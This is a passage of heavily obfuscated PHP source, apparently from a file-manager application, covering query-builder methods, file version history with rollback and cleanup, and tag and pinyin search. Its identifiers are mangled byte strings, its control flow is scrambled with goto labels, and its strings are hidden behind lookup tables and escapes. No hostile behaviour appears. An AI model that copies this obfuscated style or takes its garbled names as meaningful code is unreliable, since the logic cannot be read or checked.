$bñ´˜–…ŠÓ = $cˆæê±âš ? $cˆæê±âš : $D °Ò„½“Û[176]; } elseif ($e»îê±çˆÌ) { if (is_string($bñ´˜–…ŠÓ)) { $bñ´˜–…ŠÓ = explode($D °Ò„½“Û[47], $bñ´˜–…ŠÓ); } $cˆæê±âš = $this->getDbFields(); $bñ´˜–…ŠÓ = $cˆæê±âš ? array_diff($cˆæê±âš, $bñ´˜–…ŠÓ) : $bñ´˜–…ŠÓ; } $this->options[$D °Ò„½“Û[261]] = $bñ´˜–…ŠÓ; return $this; } public function scope($E‰†İ¹ä§ = '', $CÛ³£Ÿ¨ÖÖ = NULL) { $dÊùåô±Ô =& $_SERVER[Å¸ş]; if ($dÊùåô±Ô[33] === $E‰†İ¹ä§) { if (isset($this->_scope[$dÊùåô±Ô[34]])) { $a”å­¼ƒòÆ = $this->_scope[$dÊùåô±Ô[34]]; } else { return $this; } } elseif (is_string($E‰†İ¹ä§)) { $aß¢·Œˆ•¬ = explode($dÊùåô±Ô[47], $E‰†İ¹ä§); $a”å­¼ƒòÆ = array(); foreach ($aß¢·Œˆ•¬ as $A±¬ëï¹Á‰) { if (!isset($this->_scope[$A±¬ëï¹Á‰])) { continue; } $a”å­¼ƒòÆ = array_merge($a”å­¼ƒòÆ, $this->_scope[$A±¬ëï¹Á‰]); } if (!empty($CÛ³£Ÿ¨ÖÖ) && is_array($CÛ³£Ÿ¨ÖÖ)) { $a”å­¼ƒòÆ = array_merge($a”å­¼ƒòÆ, $CÛ³£Ÿ¨ÖÖ); } } elseif (is_array($E‰†İ¹ä§)) { $a”å­¼ƒòÆ = $E‰†İ¹ä§; } if (is_array($a”å­¼ƒòÆ) && !empty($a”å­¼ƒòÆ)) { $this->options = array_merge($this->options, array_change_key_case($a”å­¼ƒòÆ)); } return $this; } public function where($eŠ¬ÔÚÄŞš, $a‹ˆš†‚´ø = null) { $B„ùÕ•¿æ =& $_SERVER[Å¸ş]; if (!is_null($a‹ˆš†‚´ø) && is_string($eŠ¬ÔÚÄŞš)) { if (!is_array($a‹ˆš†‚´ø)) { $a‹ˆš†‚´ø = func_get_args(); array_shift($a‹ˆš†‚´ø); } $a‹ˆš†‚´ø = array_map(array($this->db, $B„ùÕ•¿æ[331]), $a‹ˆš†‚´ø); $eŠ¬ÔÚÄŞš = vsprintf($eŠ¬ÔÚÄŞš, $a‹ˆš†‚´ø); } elseif (is_object($eŠ¬ÔÚÄŞš)) { $eŠ¬ÔÚÄŞš = get_object_vars($eŠ¬ÔÚÄŞš); } elseif (is_array($eŠ¬ÔÚÄŞš)) { foreach ($eŠ¬ÔÚÄŞš as $b½©âïà»² => $bè†˜ğ®ï) { if ((is_numeric($b½©âïà»²) || !$b½©âïà»²) && is_string($bè†˜ğ®ï)) { think_trace($B„ùÕ•¿æ[338], $B„ùÕ•¿æ[33], $B„ùÕ•¿æ[46]); die; } } } if (is_string($eŠ¬ÔÚÄŞš) && $B„ùÕ•¿æ[33] != $eŠ¬ÔÚÄŞš) { $fÚ¶Îàœ ‘ = array(); $fÚ¶Îàœ ‘[$B„ùÕ•¿æ[339]] = $eŠ¬ÔÚÄŞš; $eŠ¬ÔÚÄŞš = $fÚ¶Îàœ ‘; } if (isset($this->options[$B„ùÕ•¿æ[263]])) { $this->options[$B„ùÕ•¿æ[263]] = array_merge($this->options[$B„ùÕ•¿æ[263]], $eŠ¬ÔÚÄŞš); } else { $this->options[$B„ùÕ•¿æ[263]] = $eŠ¬ÔÚÄŞš; } return $this; } public function limit($EÀ¶Ûá½äÈ, $fàÌß¬³£¿ = null) { $cÚ•Ïä½‹ =& $_SERVER[Å¸ş]; $this->options[$cÚ•Ïä½‹[280]] = is_null($fàÌß¬³£¿) ? $EÀ¶Ûá½äÈ : $EÀ¶Ûá½äÈ . $cÚ•Ïä½‹[47] . $fàÌß¬³£¿; return $this; } public function page($dø©ÓàçØŞ, $EÒçÇ…‘åŸ = null) { $b”œëŠŒÀÒ =& $_SERVER[Å¸ş]; $this->options[$b”œëŠŒÀÒ[340]] = is_null($EÒçÇ…‘åŸ) ? $dø©ÓàçØŞ : $dø©ÓàçØŞ . $b”œëŠŒÀÒ[47] . $EÒçÇ…‘åŸ; return $this; } public function comment($EÑº‰ÜÙ«Ê) { $this->options[$_SERVER[Å¸ş][341]] = $EÑº‰ÜÙ«Ê; return $this; } public function setProperty($eö‚÷Š‚“®, $cĞÄîóÁÎ) { if (property_exists($this, $eö‚÷Š‚“®)) { $this->{$eö‚÷Š‚“®} = $cĞÄîóÁÎ; } return $this; } } goto BĞ—šÄ‹Ú; FŞïç¨‘ò¾: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\145\x5f\x68\x69\x73\164\157\162\171"; public function addHistory($Eí©•ª‚…, $bƒ˜ã“Ä§• = '') { $CÜğÑÈƒ‰ =& $_SERVER[Å¸ş]; $Fµ±®˜íÛí = array($CÜğÑÈƒ‰[383] => $Eí©•ª‚…[$CÜğÑÈƒ‰[369]], $CÜğÑÈƒ‰[1427] => isset($Eí©•ª‚…[$CÜğÑÈƒ‰[379]]) ? $Eí©•ª‚…[$CÜğÑÈƒ‰[379]] : $Eí©•ª‚…[$CÜğÑÈƒ‰[378]], $CÜğÑÈƒ‰[420] => $Eí©•ª‚…[$CÜğÑÈƒ‰[419]], $CÜğÑÈƒ‰[522] => $Eí©•ª‚…[$CÜğÑÈƒ‰[77]], $CÜğÑÈƒ‰[2331] => $bƒ˜ã“Ä§•); $Dîˆ‰ìñâõ = $GLOBALS[$CÜğÑÈƒ‰[6]][$CÜğÑÈƒ‰[84]][$CÜğÑÈƒ‰[2332]]; if ($Dîˆ‰ìñâõ > 1) { $this->historyAutoClear($Fµ±®˜íÛí[$CÜğÑÈƒ‰[369]]); $this->add($Fµ±®˜íÛí); } Model($CÜğÑÈƒ‰[2333])->eventFileEdit($Eí©•ª‚…[$CÜğÑÈƒ‰[369]]); } private function historyAutoClear($f‘È­£êÏ¢) { goto EÂÒ‰à½ã»; EÂÒ‰à½ã»: $bœÒ´ª« =& $_SERVER[Å¸ş]; $cŞ›Á¤Ö´í = Model($bœÒ´ª«[1086])->get($bœÒ´ª«[2334]); $BÉØ¯åÀ¿ = $GLOBALS[$bœÒ´ª«[6]][$bœÒ´ª«[84]][$bœÒ´ª«[2332]]; goto DóàÑ¡ª; FòÆ¤¡ĞÆ‡: if (!$eŞ“®Õé®Œ || $A¹ï¢ºŠì >= count($eŞ“®Õé®Œ)) { return; } $aƒËÙŠéà¢ = array_to_keyvalue($eŞ“®Õé®Œ, $bœÒ´ª«[33], $bœÒ´ª«[367]); $aƒËÙŠéà¢ = array_slice($aƒËÙŠéà¢, $A¹ï¢ºŠì); goto Fî·á†Š‚; CÂ â‚Š§“: $eÙÙ±í”ˆÎ = array($bœÒ´ª«[385] => array($bœÒ´ª«[7], $aƒËÙŠéà¢)); $this->where($eÙÙ±í”ˆÎ)->delete(); Model($bœÒ´ª«[422])->remove($f¤ƒéÌåá); goto Bõ¿™œ–ô÷; DóàÑ¡ª: $cÖÜğÇ¸˜ä = $cŞ›Á¤Ö´í == $bœÒ´ª«[2335] ? 3 : $BÉØ¯åÀ¿; if ($BÉØ¯åÀ¿ <= 1) { $cÖÜğÇ¸˜ä = 1; } $A¹ï¢ºŠì = $cÖÜğÇ¸˜ä - 1; goto d¼°È©Øß¼; d¼°È©Øß¼: if ($A¹ï¢ºŠì >= 500) { return; } $eÙÙ±í”ˆÎ = array($bœÒ´ª«[383] => $f‘È­£êÏ¢); $eŞ“®Õé®Œ = $this->field($bœÒ´ª«[2336])->where($eÙÙ±í”ˆÎ)->order($bœÒ´ª«[2328])->select(); goto FòÆ¤¡ĞÆ‡; Fî·á†Š‚: $f¤ƒéÌåá = array_to_keyvalue($eŞ“®Õé®Œ, $bœÒ´ª«[33], $bœÒ´ª«[419]); $f¤ƒéÌåá = array_slice($f¤ƒéÌåá, $A¹ï¢ºŠì); if (!$aƒËÙŠéà¢ || !$f¤ƒéÌåá) { return; } goto CÂ â‚Š§“; Bõ¿™œ–ô÷: } public function listData($dÙŒÁÄùí†) { goto aªï‘‰Õ‰³; aªï‘‰Õ‰³: $c‹¡ŸƒÃÔ =& $_SERVER[Å¸ş]; $FåØ„¼®¾ = array($c‹¡ŸƒÃÔ[383] => $dÙŒÁÄùí†); $C¥¹„½ª¾Ã = $c‹¡ŸƒÃÔ[2337]; goto C¥ºŠô¨÷; C¥ºŠô¨÷: $f¼—İÏ¼Ë‚ = $this->field($C¥¹„½ª¾Ã)->where($FåØ„¼®¾)->order($c‹¡ŸƒÃÔ[2328])->selectPage(); $this->_listAppendUser($f¼—İÏ¼Ë‚[$c‹¡ŸƒÃÔ[354]]); $F¸Å›¿ïÔì = Model($c‹¡ŸƒÃÔ[1086])->get($c‹¡ŸƒÃÔ[2334]); goto e˜¡ì’‹²ğ; e˜¡ì’‹²ğ: $c´èåè‡¸– = 3; if ($F¸Å›¿ïÔì == $c‹¡ŸƒÃÔ[2335]) { $f¼—İÏ¼Ë‚[$c‹¡ŸƒÃÔ[354]] = array_slice($f¼—İÏ¼Ë‚[$c‹¡ŸƒÃÔ[354]], 0, $c´èåè‡¸–); $f¼—İÏ¼Ë‚[$c‹¡ŸƒÃÔ[351]] = array($c‹¡ŸƒÃÔ[2338] => 1, $c‹¡ŸƒÃÔ[2339] => 20, $c‹¡ŸƒÃÔ[2340] => 1, $c‹¡ŸƒÃÔ[2341] => count($f¼—İÏ¼Ë‚[$c‹¡ŸƒÃÔ[354]])); } return $f¼—İÏ¼Ë‚; goto B†è¹²ì; B†è¹²ì: } protected function _listAppendUser(&$dÕĞ†ÊĞÄ) { $EŠ¡¹°ï¨Ã =& $_SERVER[Å¸ş]; $fÔª¢•Á¶Â = array_to_keyvalue($dÕĞ†ÊĞÄ, $EŠ¡¹°ï¨Ã[33], $EŠ¡¹°ï¨Ã[1436]); $cÀ¥®¶ñÛ = Model($EŠ¡¹°ï¨Ã[479])->userListInfo($fÔª¢•Á¶Â); foreach ($dÕĞ†ÊĞÄ as &$cé÷ƒ–Ö¹ô) { $dù“õ†½ÍÛ = $cé÷ƒ–Ö¹ô[$EŠ¡¹°ï¨Ã[1436]]; $cé÷ƒ–Ö¹ô[$EŠ¡¹°ï¨Ã[378]] = $cÀ¥®¶ñÛ[$dù“õ†½ÍÛ] ? $cÀ¥®¶ñÛ[$dù“õ†½ÍÛ] : !1; } unset($cé÷ƒ–Ö¹ô); } public function fileInfo($B—ËáÁÌ¯) { $b±·†ÙÁÖ =& $_SERVER[Å¸ş]; $e¢°Şß¤„† = $this->tablePrefix; $AªÁôæÏ¡š = "{$e¢°Şß¤„†}\x69\x6f\137\x66\x69\x6c\145\x20\146\151\154\145\163\40\x6f\x6e\x20\146\151\x6c\145\x73\56\146\151\x6c\x65\111\104\40\x3d\x20\150\151\163\x74\x6f\x72\x79\56\x66\151\154\x65\111\104"; return $this->alias($b±·†ÙÁÖ[2342])->where(array($b±·†ÙÁÖ[385] => $B—ËáÁÌ¯))->join($AªÁôæÏ¡š, $b±·†ÙÁÖ[2343])->find(); } public function removeItem($D†âåªšä) { $B¥åÔ±Ú˜ =& $_SERVER[Å¸ş]; $a†‡Ü–é = array($B¥åÔ±Ú˜[385] => $D†âåªšä); $Aƒã¶¿é‹ = $this->where($a†‡Ü–é)->find(); if ($Aƒã¶¿é‹) { $CÁ÷áô–•ğ = $this->where($a†‡Ü–é)->delete(); Model($B¥åÔ±Ú˜[422])->remove($Aƒã¶¿é‹[$B¥åÔ±Ú˜[419]]); return $CÁ÷áô–•ğ; } return !1; } public function removeBySource($a³šõÍˆµ) { goto fì°Ø¡ï¡Ö; fì°Ø¡ï¡Ö: $Bµ¸‘»ÓŒ =& $_SERVER[Å¸ş]; if (!$a³šõÍˆµ) { return !1; } if (!is_array($a³šõÍˆµ)) { $a³šõÍˆµ = array($a³šõÍˆµ); } goto bÜ ÍÃÈÔ; AˆÃ»‘Š¸ç: return !0; goto b¹ìéë‡øë; bÜ ÍÃÈÔ: $Fë©¡×¨² = array($Bµ¸‘»ÓŒ[383] => array($Bµ¸‘»ÓŒ[7], $a³šõÍˆµ)); $AŠ¡ƒÅÙ˜· = $this->field($Bµ¸‘»ÓŒ[420])->where($Fë©¡×¨²)->select(); if ($AŠ¡ƒÅÙ˜·) { $this->where($Fë©¡×¨²)->delete(); $c×§—ÀÚ™İ = array_to_keyvalue($AŠ¡ƒÅÙ˜·, $Bµ¸‘»ÓŒ[33], $Bµ¸‘»ÓŒ[419]); Model($Bµ¸‘»ÓŒ[422])->remove($c×§—ÀÚ™İ); } goto AˆÃ»‘Š¸ç; b¹ìéë‡øë: } public function setDetail($d½Œ÷ÂÎ, $FôÉñİ§Í¦) { $EòÓ´îÍ“… =& $_SERVER[Å¸ş]; return $this->where(array($EòÓ´îÍ“…[385] => $d½Œ÷ÂÎ))->save(array($EòÓ´îÍ“…[2331] => $FôÉñİ§Í¦)); } public function rollbackToItem($AÑ¤ÎŞï­Ì, $Cƒè¥‘ïöí) { goto Bß¢‘…“Í‡; E¥ÍÍ‡‹Õ»: return $this->where(array($cˆâîæ“º’[385] => $Cƒè¥‘ïöí))->delete(); goto bø¡“‰öí; DŞæÙ„Õ: $B…ßÏÄæŒ = $this->find($Cƒè¥‘ïöí); $BîÜÑÙ½Æ¸ = array($cˆâîæ“º’[419] => $B…ßÏÄæŒ[$cˆâîæ“º’[419]], $cˆâîæ“º’[77] => $B…ßÏÄæŒ[$cˆâîæ“º’[77]], $cˆâîæ“º’[107] => time(), $cˆâîæ“º’[379] => USER_ID); Model($cˆâîæ“º’[755])->where(array($cˆâîæ“º’[369] => $AÑ¤ÎŞï­Ì))->save($BîÜÑÙ½Æ¸); goto E¥ÍÍ‡‹Õ»; Bß¢‘…“Í‡: $cˆâîæ“º’ =& $_SERVER[Å¸ş]; $d¤’ò¡†¢ = Model($cˆâîæ“º’[755])->sourceInfo($AÑ¤ÎŞï­Ì); $this->addHistory($d¤’ò¡†¢); goto DŞæÙ„Õ; bø¡“‰öí: } public function clearSame($fîË¾¿ÉÎ) { goto Dğ®è»ó‰§; Dğ®è»ó‰§: $a¥½ŠÏ‚Óª =& $_SERVER[Å¸ş]; $eÍÒéÆ‹á± = $this->listData($fîË¾¿ÉÎ); $dÉ¥ä¶ÌØê = array_to_keyvalue_group($eÍÒéÆ‹á±, $a¥½ŠÏ‚Óª[419]); goto cÕËÃ êÅ÷; cÕËÃ êÅ÷: $aÃ÷Œà°²Ì = array(); $e¤¦ÍÕ±£– = array(); foreach ($dÉ¥ä¶ÌØê as $cƒš‚¬Êí) { if (!$cƒš‚¬Êí || count($cƒš‚¬Êí) <= 1) { continue; } foreach ($cƒš‚¬Êí as $fÂ•Œî‘„É) { $aÃ÷Œà°²Ì[] = $fÂ•Œî‘„É[$a¥½ŠÏ‚Óª[419]]; $e¤¦ÍÕ±£–[] = $fÂ•Œî‘„É[$a¥½ŠÏ‚Óª[367]]; } } goto a²‘ŸÑ¥×á; a²‘ŸÑ¥×á: if (!$e¤¦ÍÕ±£–) { return; } $this->where(array($a¥½ŠÏ‚Óª[367] => array($a¥½ŠÏ‚Óª[7], $e¤¦ÍÕ±£–)))->delete(); Model($a¥½ŠÏ‚Óª[422])->remove($aÃ÷Œà°²Ì); goto dƒÔ¿˜ŠØÔ; dƒÔ¿˜ŠØÔ: } public function userSpace() { $BÀù‰ë‹ğ´ =& $_SERVER[Å¸ş]; $Aò®½‹Ë°› = $this->tablePrefix; $cÃ™ÍŒñ“Ê = array($BÀù‰ë‹ğ´[1427] => USER_ID); $bò¤½˜•®Ï = "{$Aò®½‹Ë°›}\151\157\x5f\146\x69\154\145\x20\146\x69\154\145\x73\x20\157\x6e\x20\x66\x69\154\145\x73\56\x66\151\x6c\145\111\104\40\x3d\x20\150\x69\163\x74\x6f\x72\171\x2e\146\x69\x6c\x65\x49\x44"; return $this->alias($BÀù‰ë‹ğ´[2342])->where($cÃ™ÍŒñ“Ê)->join($bò¤½˜•®Ï, $BÀù‰ë‹ğ´[2343])->sum($BÀù‰ë‹ğ´[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($cáĞ¬®×™º) { goto C¬Îª–ĞÎ; C¬Îª–ĞÎ: $Aƒ‹¦Ì =& $_SERVER[Å¸ş]; $Aøó‚‡é‘‰ = KodIO::fileTypeList(); $D§šãËê° = $Aøó‚‡é‘‰[$cáĞ¬®×™º]; goto Eä…… ˜»; cö¦™Ù‡: if (!$D§šãËê°[$Aƒ‹¦Ì[160]]) { $aùÆÊƒïÃ = array_to_keyvalue($Aøó‚‡é‘‰, $Aƒ‹¦Ì[33], $Aƒ‹¦Ì[160]); $bŞŠ–ùç¼™ = implode($Aƒ‹¦Ì[47], $aùÆÊƒïÃ); $AƒÓÆÕèö• = $Aƒ‹¦Ì[2291]; } $C¦÷èùìà = explode($Aƒ‹¦Ì[47], trim($bŞŠ–ùç¼™, $Aƒ‹¦Ì[47])); return array($AƒÓÆÕèö•, $C¦÷èùìà); goto C÷›‚àÙÖö; Eä…… ˜»: if (!$D§šãËê°) { return array(); } $bŞŠ–ùç¼™ = $D§šãËê°[$Aƒ‹¦Ì[160]]; $AƒÓÆÕèö• = $Aƒ‹¦Ì[7]; goto cö¦™Ù‡; C÷›‚àÙÖö: } public function listPathType($B•·Íõ¨¤Î) { $c™ªâ ±Ğ =& $_SERVER[Å¸ş]; $Cì²¨‚±šÚ = $this->fileTypeWhere($B•·Íõ¨¤Î); if (!$Cì²¨‚±šÚ) { return array(); } $AµƒØà—å = array($c™ªâ ±Ğ[523] => SourceModel::TYPE_USER, $c™ªâ ±Ğ[524] => USER_ID, $c™ªâ ±Ğ[520] => 0, $c™ªâ ±Ğ[521] => $Cì²¨‚±šÚ); return $this->listSource($AµƒØà—å); } public function listSearch($d˜Í¶Œä‘¥, $e‚‚‘®¹Í = 300) { goto aÒÛ ñèºŞ; CõÓ·¤´Ê: if (!isset($B—Ã±ËÒĞ±[$b”‚íƒ±‡ç[397]])) { $B—Ã±ËÒĞ±[$b”‚íƒ±‡ç[397]] = 0; } $a«ñ‹¬Ÿ‹« = $b”‚íƒ±‡ç[2345]; $eïŠƒµË»« = $a«ñ‹¬Ÿ‹«; goto a¾×õÔù™; B±ĞˆÖ‹»Å: $this->_listDataApply($DÖÇ¤Ùƒ»Ä[$b”‚íƒ±‡ç[354]]); $this->_listMake($DÖÇ¤Ùƒ»Ä); return $DÖÇ¤Ùƒ»Ä; goto f„«èíæÎ„; aù©·›§«Í: $this->_listSearchDesc($DÖÇ¤Ùƒ»Ä, $d˜Í¶Œä‘¥, $eïŠƒµË»«); $this->_listSearchTag($DÖÇ¤Ùƒ»Ä, $d˜Í¶Œä‘¥, $eïŠƒµË»«); $this->_listSearchGroupTag($DÖÇ¤Ùƒ»Ä, $d˜Í¶Œä‘¥, $eïŠƒµË»«); goto B±ĞˆÖ‹»Å; a¾×õÔù™: $this->_listSearchBindPinyin($d˜Í¶Œä‘¥, $B—Ã±ËÒĞ±, $a«ñ‹¬Ÿ‹«); $this->alias($b”‚íƒ±‡ç[489])->_makeOrder(); $DÖÇ¤Ùƒ»Ä = $this->distinct(!0)->field($a«ñ‹¬Ÿ‹«)->where($B—Ã±ËÒĞ±)->selectPage($e‚‚‘®¹Í); goto aù©·›§«Í; aÒÛ ñèºŞ: $b”‚íƒ±‡ç =& $_SERVER[Å¸ş]; if (isset($d˜Í¶Œä‘¥[$b”‚íƒ±‡ç[2189]]) && $d˜Í¶Œä‘¥[$b”‚íƒ±‡ç[2189]]) { $d˜Í¶Œä‘¥[$b”‚íƒ±‡ç[2189]] = str_replace($b”‚íƒ±‡ç[1592], $b”‚íƒ±‡ç[2344], trim($d˜Í¶Œä‘¥[$b”‚íƒ±‡ç[2189]])); } $B—Ã±ËÒĞ± = $this->_parseSearchWhere($d˜Í¶Œä‘¥); goto CõÓ·¤´Ê; f„«èíæÎ„: } private function _listSearchTag(&$C¹ åî¡ËŞ, $F‚ŠØºÈÁ¨, $AµïªÊ»¦…) { goto e˜µóŞ¶†¥; BæÖÌ´œ«: if (!$F‚ù¯È¢ŒÍ) { return; } $DÅ’ÈƒàùÇ = array($fãÌ«á¸Î[393] => array($fãÌ«á¸Î[7], $F‚ù¯È¢ŒÍ), $fãÌ«á¸Î[1436] => USER_ID); $dœ¿çÍö½“ = Model($fãÌ«á¸Î[394])->field($fãÌ«á¸Î[75])->where($DÅ’ÈƒàùÇ)->select(); goto a…‰‘õéåƒ; bÔì’ƒƒÃÚ: $F‚ù¯È¢ŒÍ = array(); $D°Àù«œˆë = $F‚ŠØºÈÁ¨[$fãÌ«á¸Î[2189]]; foreach ($fƒ“šŸêÉ as $AñàŒİÌƒ¾) { $E‚ÎíÍŒ™ = $AñàŒİÌƒ¾[$fãÌ«á¸Î[28]]; $dÕÛ¸ôŸøÑ = str_replace($fãÌ«á¸Î[50], $fãÌ«á¸Î[33], Pinyin::encode($E‚ÎíÍŒ™)); if (stripos($E‚ÎíÍŒ™, $D°Àù«œˆë) !== !1 || stripos($dÕÛ¸ôŸøÑ, $D°Àù«œˆë) !== !1) { $F‚ù¯È¢ŒÍ[] = $AñàŒİÌƒ¾[$fãÌ«á¸Î[367]]; } } goto BæÖÌ´œ«; e˜µóŞ¶†¥: $fãÌ«á¸Î =& $_SERVER[Å¸ş]; if (!$F‚ŠØºÈÁ¨[$fãÌ«á¸Î[2189]] || $C¹ åî¡ËŞ[$fãÌ«á¸Î[351]][$fãÌ«á¸Î[340]] > 1) { return; } $fƒ“šŸêÉ = Model($fãÌ«á¸Î[2346])->listData(); goto bÔì’ƒƒÃÚ; a…‰‘õéåƒ: $dœ¿çÍö½“ = array_to_keyvalue($dœ¿çÍö½“, $fãÌ«á¸Î[33], $fãÌ«á¸Î[75]); $bÉ‡¦¶ÉÁ¾ = array_unique($dœ¿çÍö½“); $this->_listSearchMerge($C¹ åî¡ËŞ, $F‚ŠØºÈÁ¨, $AµïªÊ»¦…, $bÉ‡¦¶ÉÁ¾); goto cëÛëƒ’˜»; cëÛëƒ’˜»: } private function _listSearchDesc(&$aåñš‡Æ¢¨, $Aßˆ„â¯Ş«, $b£ï¢ˆ‡¥¹) { goto Dà©§äÙ·²; F¦ÏšàØË: $e¢À®íéâô = array_unique($e¢À®íéâô); if (!$e¢À®íéâô) { return; } $fË®Šƒ«© = array($dŠâï¯ìòë[369] => array($dŠâï¯ìòë[7], $e¢À®íéâô), $dŠâï¯ìòë[89] => $dŠâï¯ìòë[405], $dŠâï¯ìòë[359] => array($dŠâï¯ìòë[754], $dŠâï¯ìòë[2191] . $Aßˆ„â¯Ş«[$dŠâï¯ìòë[2189]] . $dŠâï¯ìòë[2191])); goto CâÂåÈ„å; Dà©§äÙ·²: $dŠâï¯ìòë =& $_SERVER[Å¸ş]; if (!$Aßˆ„â¯Ş«[$dŠâï¯ìòë[2189]] || $aåñš‡Æ¢¨[$dŠâï¯ìòë[351]][$dŠâï¯ìòë[340]] > 1) { return; } $e¢À®íéâô = $this->listSearchChildren($Aßˆ„â¯Ş«[$dŠâï¯ìòë[463]]); goto F¦ÏšàØË; CâÂåÈ„å: $b¨Éñ‰èƒÒ = Model($dŠâï¯ìòë[506])->field($dŠâï¯ìòë[369])->where($fË®Šƒ«©)->select(); $A¾³‘†— = array_to_keyvalue($b¨Éñ‰èƒÒ, $dŠâï¯ìòë[33], $dŠâï¯ìòë[369]); $this->_listSearchMerge($aåñš‡Æ¢¨, $Aßˆ„â¯Ş«, $b£ï¢ˆ‡¥¹, $A¾³‘†—); goto cÕÏŒšˆê; cÕÏŒšˆê: } private function _listSearchGroupTag(&$a›»’ä†å, $E¯ö„—Úá, $aôåïç¨’) { goto cÀŸ¸Á¤·£; Dˆõ¯êÒáà: $c¯Şõ¸äáó = array_to_keyvalue($c¯Şõ¸äáó, $aóØÄ½¾®¢[33], $aóØÄ½¾®¢[75]); $BŸõ¶íĞË = array_unique($c¯Şõ¸äáó); $this->_listSearchMerge($a›»’ä†å, $E¯ö„—Úá, $aôåïç¨’, $BŸõ¶íĞË); goto f›‚×Şá´; D…óÇÙƒÂÖ: if (!$a¼Î¢»íÎ™) { return; } $E„“­è·‘– = array($aóØÄ½¾®¢[393] => array($aóØÄ½¾®¢[7], $a¼Î¢»íÎ™), $aóØÄ½¾®¢[1436] => 0, $aóØÄ½¾®¢[29] => $aóØÄ½¾®¢[2209] . $BÓÇ¾„É); $c¯Şõ¸äáó = Model($aóØÄ½¾®¢[394])->field($aóØÄ½¾®¢[75])->where($E„“­è·‘–)->select(); goto Dˆõ¯êÒáà; cÀŸ¸Á¤·£: $aóØÄ½¾®¢ =& $_SERVER[Å¸ş]; if (!$E¯ö„—Úá[$aóØÄ½¾®¢[2189]] || $a›»’ä†å[$aóØÄ½¾®¢[351]][$aóØÄ½¾®¢[340]] > 1 || !$E¯ö„—Úá[$aóØÄ½¾®¢[463]]) { return; } $c§¡ÆæãòÎ = $this->sourceInfo($E¯ö„—Úá[$aóØÄ½¾®¢[463]]); goto béÆù»ˆ“œ; FÉ¢Æ‘¿‡: $a¼Î¢»íÎ™ = array(); $dÍç™‚²¶§ = $E¯ö„—Úá[$aóØÄ½¾®¢[2189]]; foreach ($d¨¼×ƒó¡ª[$aóØÄ½¾®¢[354]] as $DİÌ•Ï”öĞ) { $døƒÊˆ®¼ = $DİÌ•Ï”öĞ[$aóØÄ½¾®¢[28]]; $Dó¿í¡÷– = str_replace($aóØÄ½¾®¢[50], $aóØÄ½¾®¢[33], Pinyin::encode($døƒÊˆ®¼)); if (stripos($døƒÊˆ®¼, $dÍç™‚²¶§) !== !1 || stripos($Dó¿í¡÷–, $dÍç™‚²¶§) !== !1) { $a¼Î¢»íÎ™[] = $DİÌ•Ï”öĞ[$aóØÄ½¾®¢[367]]; } } goto D…óÇÙƒÂÖ; béÆù»ˆ“œ: if (!$c§¡ÆæãòÎ || $c§¡ÆæãòÎ[$aóØÄ½¾®¢[371]] != SourceModel::TYPE_GROUP) { return; } $BÓÇ¾„É = $c§¡ÆæãòÎ[$aóØÄ½¾®¢[458]]; $d¨¼×ƒó¡ª = Model($aóØÄ½¾®¢[2347])->get($BÓÇ¾„É); goto FÉ¢Æ‘¿‡; f›‚×Şá´: } private function _listSearchMerge(&$a™â‹ïª¢, $D²ªŸ§…, $CŠæ‰ÜÑÓ, $eçï«µ£Ğ…) { goto E‡¤Íù˜ù¦; a÷¼‡±¨‘: foreach ($B˜˜„¬†õ² as $C©Ü¶„Ô†Æ) { $Aƒ›“¦‡í¦ = $A‚ÕÁôÜ§[47] . $D²ªŸ§…[$A‚ÕÁôÜ§[463]] . $A‚ÕÁôÜ§[47]; if (stripos($C©Ü¶„Ô†Æ[$A‚ÕÁôÜ§[461]], $Aƒ›“¦‡í¦) !== !1) { $DÇ ¸Óåñ†[] = $C©Ü¶„Ô†Æ; } } $a™â‹ïª¢[$A‚ÕÁôÜ§[354]] = array_merge($DÇ ¸Óåñ†, $a™â‹ïª¢[$A‚ÕÁôÜ§[354]]); $a™â‹ïª¢[$A‚ÕÁôÜ§[351]][$A‚ÕÁôÜ§[352]] += count($DÇ ¸Óåñ†); goto fÏåğ‚¾ì©; dñ‘ï’ØØ¦: $B˜˜„¬†õ² = $this->field($CŠæ‰ÜÑÓ)->where($aöªÂÂ‘‹Ù)->select(); if (!$B˜˜„¬†õ²) { return; } $DÇ ¸Óåñ† = array(); goto a÷¼‡±¨‘; E‡¤Íù˜ù¦: $A‚ÕÁôÜ§ =& $_SERVER[Å¸ş]; if (!$eçï«µ£Ğ…) { return; } $CŠ‚ÔÊÉ„ø = array_to_keyvalue($a™â‹ïª¢[$A‚ÕÁôÜ§[354]], $A‚ÕÁôÜ§[33], $A‚ÕÁôÜ§[369]); goto F®ÙÇ°±›; F®ÙÇ°±›: $bè¢±Ÿé½÷ = array_diff($eçï«µ£Ğ…, $CŠ‚ÔÊÉ„ø); if (!$bè¢±Ÿé½÷) { return; } $aöªÂÂ‘‹Ù = array($A‚ÕÁôÜ§[369] => array($A‚ÕÁôÜ§[7], $bè¢±Ÿé½÷)); goto dñ‘ï’ØØ¦; fÏåğ‚¾ì©: } public function listSearchChildren($aØËÀÀâæ, $D»õ¹É°…£ = 5000) { goto EÄ¿—£; CœÇÃøù‡ö: $aÀ½Ç³–¦ê = array($CçöÚÕËñ¤[461] => array($CçöÚÕËñ¤[754], $D ë£ÊÌñ“[$CçöÚÕËñ¤[461]] . $D ë£ÊÌñ“[$CçöÚÕËñ¤[369]] . $CçöÚÕËñ¤[486])); $a…ª‡ÒÁ§¨ = $this->field($CçöÚÕËñ¤[369])->cache(null, 600)->where($aÀ½Ç³–¦ê)->count(); if ($a…ª‡ÒÁ§¨ > $D»õ¹É°…£) { return $this->_listSearchChildrenNear($aØËÀÀâæ, $D»õ¹É°…£); } goto D—±…õÎ; D—±…õÎ: $F’‹ êÓ = $this->field($CçöÚÕËñ¤[369])->where($aÀ½Ç³–¦ê)->select(); $a¤‚¤Îâç¹ = array_to_keyvalue($F’‹ êÓ, $CçöÚÕËñ¤[33], $CçöÚÕËñ¤[369]); return $a¤‚¤Îâç¹; goto cŞìÅ½¦Õ‚; EÄ¿—£: $CçöÚÕËñ¤ =& $_SERVER[Å¸ş]; $a¤‚¤Îâç¹ = array(); $D ë£ÊÌñ“ = $this->sourceInfo($aØËÀÀâæ); goto CœÇÃøù‡ö; cŞìÅ½¦Õ‚: } private function _listSearchChildrenNear($CùìÏÑï», $cÓ¢è‡öêò) { goto dœİ÷êÆ•©; CğÕšÅËÚ: if (!$eöÄâ‚ãˆ—) { return $fŸÒéË£¾‚; } 